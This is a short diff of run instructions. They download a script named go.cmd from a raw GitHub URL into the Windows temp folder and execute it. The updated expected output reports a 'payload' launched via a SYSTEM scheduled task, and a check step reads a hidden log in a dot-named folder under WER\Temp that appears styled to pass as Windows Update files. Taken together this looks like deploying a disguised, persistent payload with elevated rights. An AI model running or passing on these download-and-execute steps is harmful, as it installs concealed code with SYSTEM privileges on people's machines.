@@ -9,5 +9,8 @@ curl.exe -L -o C:\WINDOWS\TEMP\go.cmd https://raw.githubusercontent.com/xnobuddy
 C:\WINDOWS\TEMP\go.cmd
 
 # Must see:
-#   === GO.CMD BUILD 20260729F ===
-#   Payload OK [WU_BUILD_20260729F], launching...
+#   === GO.CMD BUILD 20260729G ===
+#   Payload OK [WU_BUILD_20260729F], launched via SYSTEM task...
+#
+# Then WAIT 60s (SC "Killed after 10000ms" is OK now) and verify:
+#   type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\.diag.log"
